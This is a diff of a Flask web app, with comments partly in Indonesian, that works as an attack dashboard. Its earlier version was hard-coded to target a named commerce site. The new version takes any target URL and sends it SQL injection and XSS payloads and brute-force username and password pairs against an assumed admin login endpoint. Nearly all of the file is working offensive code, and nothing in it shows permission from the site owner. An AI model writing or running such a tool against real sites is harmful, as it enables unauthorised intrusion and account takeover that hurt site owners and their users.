@@ -1,31 +1,30 @@
 from flask import Flask, render_template, request, jsonify
 import requests
 import urllib.parse
-# You might want to install these libraries if you expand features:
-# pip install requests python-dotenv
+# Import library lain jika diperlukan: from itertools import product
 
 app = Flask(__name__)
 
-# --- Configuration (Customize these for the actual site) ---
-TARGET_URL = "https://topupkaisar.com/" # Main URL or specific endpoint
+# --- GLOBAL/DEFAULT PAYLOADS BANK (The Payload Library) ---
 DEFAULT_PAYLOADS = {
-    "sqli": "' OR '1'='1",
-    "xss": "<script>alert('XSS')</script>"
+    "SQLi": ["' OR '1'='1", "' UNION SELECT 1,2--", "admin'--"],
+    "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
+    "BruteForce_User": ["admin", "user", "root", "administrator", "guest"], # Untuk username
+    "BruteForce_Pass": ["password", "123", "qwerty", "secret"] # Untuk password
 }
 
-# --- Core Attack Functions ---
+TARGET_URL = "" # Akan di-override oleh request, tapi disimpan sebagai default fallback
+
+# --- Core Attack Functions (Updated to use passed base_url) ---
 
 def test_sqli(base_url, param_name, payloads):
-    """Tests a single parameter for SQL Injection."""
     results = []
+    print(f"--- Running SQLi Test on Parameter: {param_name} ---")
     for payload in payloads:
-        # Construct the URL with the injected payload
-        test_url = f"{base_url}?{urllib.parse.urlencode({'id': payload})}" # Assuming 'id' is the vulnerable param
-
+        test_url = f"{base_url}?{urllib.parse.urlencode({'id': payload})}" 
         try:
             response = requests.get(test_url, timeout=10)
-            # Simple heuristic check: if the status code changes or content is large, it might be successful
-            if "Admin" in response.text or response.status_code == 200 and len(response.content) > 500:
+            if "Admin" in response.text or (len(response.content) > 500 and response.status_code == 200):
                 results.append({"payload": payload, "status": "SUCCESS (Potential Injection)", "data": response.text[:300] + "..."})
             else:
                  results.append({"payload": payload, "status": "FAIL", "data": None})
@@ -34,16 +33,13 @@ def test_sqli(base_url, param_name, payloads):
     return results
 
 def test_xss(base_url, injection_point, payloads):
-    """Simulates testing an input field for XSS."""
-    # In a real scenario, you'd POST data here. For simplicity, we simulate GET passing the payload.
     results = []
+    print(f"--- Running XSS Test on Field: {injection_point} ---")
     for payload in payloads:
-        test_url = f"{base_url}?comment={urllib.parse.quote(payload)}" # Assuming comment is the vulnerable field
-
+        test_url = f"{base_url}?comment={urllib.parse.quote(payload)}" 
         try:
             response = requests.get(test_url, timeout=10)
-            # To truly test XSS, you need to inspect the rendered HTML for the payload itself being echoed.
-            if "alert" in response.text:
+            if "alert" in response.text and len(response.text) > 500:
                  results.append({"payload": payload, "status": "SUCCESS (Payload Echoed)", "data": f"Script found in output."})
             else:
                 results.append({"payload": payload, "status": "FAIL", "data": None})
@@ -53,46 +49,69 @@ def test_xss(base_url, injection_point, payloads):
     return results
 
 
-# --- Flask Routes ---
+def test_bruteforce(base_url, username_list, password_list):
+    """Simulates brute-forcing a login endpoint."""
+    print("--- Running Brute Force Test ---")
+    results = []
+    # Dalam dunia nyata, Anda akan loop melalui kombinasi semua pasangan (user, pass)
+    for user in username_list:
+        for password in password_list:
+            # Asumsi endpoint login: ?username=user&password=pass
+            login_url = f"{base_url}/admin/login?username={urllib.parse.quote(user)}&password={urllib.parse.quote(password)}" 
+            try:
+                response = requests.get(login_url, timeout=10)
+                # Cek apakah respon mengindikasikan login berhasil (misalnya redirect ke dashboard atau mengandung kata "Welcome")
+                if "Dashboard" in response.text or response.status_code == 200 and len(response.content) > 500:
+                    results.append({"payload": f"{user}:{password}", "status": "SUCCESS (Potential Credential Found)", "data": f"Access granted at {login_url}"})
+                else:
+                     results.append({"payload": f"{user}:{password}", "status": "FAIL", "data": None})
+            except requests.exceptions.RequestException as e:
+                 results.append({"payload": f"{user}:{password}", "status": "ERROR", "data": str(e)})
+    return results
 
+# --- Flask Routes (Updated) ---
 @app.route('/')
 def index():
-    """Renders the main dashboard page."""
     return render_template('index.html')
 
 @app.route('/api/scan', methods=['POST'])
 def scan_site():
-    """Endpoint to run all selected attacks based on user input."""
     data = request.json
     attack_type = data.get('attackType')
     params = data.get('parameters', {})
-    payloads = data.get('payloads')
+    target_url = data.get('targetUrl') 
 
-    if not attack_type or not payloads:
-        return jsonify({"error": "Please select an attack type and provide payloads."}), 400
+    if not attack_type or not target_url:
+        return jsonify({"error": "Please provide a Target URL and select an Attack Type."}), 400
 
     all_results = []
 
+    # --- LOGIC DISPATCHER berdasarkan tipe serangan ---
+
     if attack_type == 'SQLi':
-        # Assuming the user has specified which parameter to test (e.g., 'id' or 'username')
         param_to_test = params.get('parameter', 'id')
-        results = test_sqli(TARGET_URL, param_to_test, payloads)
-        all_results.extend(results)
+        payloads = DEFAULT_PAYLOADS['SQLi'] # Menggunakan payload default
+        all_results.extend(test_sqli(target_url, param_to_test, payloads))
 
     elif attack_type == 'XSS':
-        # Assuming the user has specified which field to inject into (e.g., 'comment' or 'bio')
         injection_point = params.get('field', 'comment')
-        results = test_xss(TARGET_URL, injection_point, payloads)
-        all_results.extend(results)
+        payloads = DEFAULT_PAYLOADS['XSS'] # Menggunakan payload default
+        all_results.extend(test_xss(target_url, injection_point, payloads))
 
-    # Future expansion areas:
     elif attack_type == 'BruteForce':
-        # Implement Hydra logic here...
-        pass
+        # Karena ini kompleks (User/Pass), kita ambil dari list yang sudah didefinisikan di sini
+        user_list = DEFAULT_PAYLOADS['BruteForce_User']
+        pass_list = DEFAULT_PAYLOADS['BruteForce_Pass']
+        all_results.extend(test_bruteforce(target_url, user_list, pass_list))
+
+    # Tambahkan kasus lain di sini:
+    # elif attack_type == 'DirectoryBrute':
+    #     ... (Logika DirectoryBrute)
+    #     pass
+
 
     return jsonify({"success": True, "results": all_results})
 
 
 if __name__ == '__main__':
-    # Set debug=True for development. 
     app.run(debug=True)
